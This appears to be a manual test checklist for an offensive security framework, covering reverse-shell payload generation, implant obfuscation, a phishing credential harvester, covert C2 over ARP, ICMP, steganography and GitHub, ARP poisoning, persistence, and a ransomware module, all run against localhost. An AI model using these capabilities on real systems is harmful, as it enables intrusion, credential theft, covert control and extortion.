# Comprehensive Test Plan

This document outlines the steps to manually test and verify the functionality of all features within the Advanced Security Framework.

## 1. Shell and Core Commands

-   [ ] **`help`**:
    -   **Action:** Run the `help` command.
    -   **Expected:** The main help menu is displayed correctly, showing all top-level commands.
-   [ ] **`exit`**:
    -   **Action:** Run the `exit` command.
    -   **Expected:** The shell exits gracefully.
-   [ ] **`targets`**:
    -   **Action:** Run `targets` on a fresh startup.
    -   **Expected:** A "No targets found" message is displayed.
-   [ ] **`scan <subnet>`**:
    -   **Action:** Run `scan 127.0.0.1/32`.
    -   **Expected:** The scan discovers the localhost and adds it to the target list.
-   [ ] **`set` and `info`**:
    -   **Action:** Run `set 127.0.0.1` after a scan.
    -   **Expected:** The shell prompt updates to show the selected target.
    -   **Action:** Run `info`.
    -   **Expected:** The `info` command displays the correct information for the selected target.
-   [ ] **`recon <ip>`**:
    -   **Action:** Run `recon 127.0.0.1`.
    -   **Expected:** A detailed Nmap scan runs and the results, including OS and service versions, are printed. The results are also stored in the target manager.
-   [ ] **`explain <type>`**:
    -   **Action:** Run `explain xxe`.
    -   **Expected:** A detailed explanation of the XXE attack is displayed.

## 2. Payload Generation

-   [ ] **`generate <platform> <lhost> <lport> <output>`**:
    -   **Action:** Run `generate windows 127.0.0.1 4444 /tmp/payload.exe`. (Requires msfvenom to be installed).
    -   **Expected:** A Windows reverse TCP payload is created at `/tmp/payload.exe`.
-   [ ] **`generate_file <type>`**:
    -   **Action:** Run `generate_file xxe`.
    -   **Expected:** A malicious `xxe.xml` file is created in the `test_files` directory.
-   [ ] **`morph <input> <output>`**:
    -   **Action:** Run `morph icmp_implant.py /tmp/morphed_implant.py`.
    -   **Expected:** A new, obfuscated version of the implant is created at `/tmp/morphed_implant.py`.
-   [ ] **`qrcode <url> <output>`**:
    -   **Action:** Run `qrcode http://example.com /tmp/qr.png`.
    -   **Expected:** A QR code image is created at `/tmp/qr.png`.

## 3. Social Engineering (`lure`)

-   [ ] **`lure harvest`**:
    -   **Action:** Run `lure harvest` in a separate terminal.
    -   **Expected:** The credential harvester server starts.
-   [ ] **`lure web <url>`**:
    -   **Action:** With the harvester running, run `lure web http://example.com`.
    -   **Expected:** A `cloned_site/index.html` is created with forms redirected to the harvester.
    -   **Verification:** Open the cloned file in a browser, submit a form, and check the harvester terminal for captured credentials.

## 4. Covert C2 Channels

### `covert` (ARP)
-   [ ] **`covert generate_listener <path>`**:
    -   **Action:** Run `covert generate_listener /tmp/listener.py`.
    -   **Expected:** The listener script is created.
-   [ ] **`covert send_cmd <ip> <cmd>`**:
    -   **Action:** Run the listener in one terminal and `covert send_cmd 127.0.0.1 "echo test > /tmp/test.txt"` in another. (Requires root).
    -   **Expected:** The file `/tmp/test.txt` is created.

### `icmp`
-   [ ] **`icmp generate <path>`**:
    -   **Action:** Run `icmp generate /tmp/implant.py`.
    -   **Expected:** The ICMP implant is created.
-   [ ] **`icmp listen` and `icmp send`**:
    -   **Action:** Run the implant and the `icmp listen` command in separate terminals. Then run `icmp send 127.0.0.1 "whoami"`. (Requires root).
    -   **Expected:** The listener terminal should print the output of the "whoami" command.

### `stego_c2`
-   [ ] **`stego_c2 start`**:
    -   **Action:** Run `stego_c2 start`.
    -   **Expected:** The steganography C2 server starts.
-   [ ] **`stego_c2 command <cmd>`**:
    -   **Action:** Run `stego_c2 command "ls -l"`.
    -   **Expected:** The command is encoded into the command image.
-   [ ] **Implant Check-in**:
    -   **Action:** Run the generated `stego_implant.py`.
    -   **Expected:** The C2 server should receive the output of the "ls -l" command.

### `github_c2`
-   [ ] **`github_c2 configure <token> <owner> <repo>`**:
    -   **Action:** Configure the C2 with a valid GitHub token and repository.
    -   **Expected:** The C2 is configured successfully.
-   [ ] **`github_c2 command <cmd>`**:
    -   **Action:** Run `github_c2 command "whoami"`.
    -   **Expected:** The command is successfully written to the repository.
-   [ ] **Implant Check-in**:
    -   **Action:** Run the generated `github_implant.py`.
    -   **Expected:** The implant should execute the command and commit the output back to the repository. `github_c2 output` should retrieve it.

## 5. Attack Modules

### `mitm`
-   [ ] **`mitm scan <subnet>`**:
    -   **Action:** Run `mitm scan` on a local subnet.
    -   **Expected:** A list of live hosts is returned.
-   [ ] **`mitm poison <target> <gateway>`**:
    -   **Action:** Run an ARP poisoning attack. (Requires root and a proper network setup).
    -   **Expected:** The target's ARP table should be poisoned.

### `persist`
-   [ ] **`persist <os> <path>`**:
    -   **Action:** Run `persist windows C:\\path\\to\\implant.exe`.
    -   **Expected:** The correct command for creating a Windows Run key is displayed.
    -   **Action:** Run `persist linux /path/to/implant.py`.
    -   **Expected:** The correct command for creating a Linux cron job is displayed.

### `ransom`
-   [ ] **`ransom <dir>`**:
    -   **Action:** Run `ransom /tmp/test_encryption`.
    -   **Expected:** Files in the test directory are encrypted and a ransom note is dropped.
